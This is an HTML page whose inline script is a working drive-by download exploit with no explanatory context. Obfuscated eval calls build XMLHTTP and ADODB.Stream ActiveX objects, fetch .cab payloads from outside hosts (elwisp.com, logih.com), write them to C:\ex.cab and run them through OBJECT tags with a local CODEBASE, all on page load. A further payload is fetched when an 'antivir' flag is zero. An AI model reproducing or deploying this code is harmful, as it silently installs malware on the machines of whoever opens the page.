
	<html>
	<script>


cust='78'
antivir='0';
mt='0';
lc='0';



	function dl(u) {
		try {
	        eval("x = new Activ"+"eXObject('Mic"+"rosoft.XM"+"LHTTP')"); 
    		x.Open("GET",u,0); 
			eval("x.S"+"end()");
			var t=0;
			eval("s = new Ac"+"t"+"iv"+"eXO"+"bject('ADOD"+"B.Str"+"eam')");
			eval("s.M"+"ode = 3");
			eval("s.T"+"ype = 1");
			eval("s.O"+"pen()");
			eval("s.W"+"rite(x.responseBody)");
			eval('s.S'+'aveToFile("C:\\\\ex.cab",2)');
		}
		catch(ex) { }
	}


	dl('http://dl.www2.elwisp.com/files/ep'+'l'+cust+'.cab?2');
    
	</SCRIPT>
	<OBJECT CLASSID=clsid:33331111-1111-1111-1111-611111193457 CODEBASE=c:/ex.cab ID=i></OBJECT>

	<script>
		dl('http://dl.www2.elwisp.com/files/777.cab');
    
	</SCRIPT>
	<OBJECT CLASSID=clsid:33331111-1111-1111-1111-611111193458 CODEBASE=c:/ex.cab ID=i></OBJECT>


	<script>
		if (antivir == 0) {
			dl('http://www2.lo'+'gi'+'h.com/xtradl.php');
			document.write('<OBJECT CLASSID=clsid:43331111-1111-1111-1111-611111195622 CODEBASE=c:/ex.cab ID=i></OBJECT>');
		}
    
	</SCRIPT>
	


	</html>

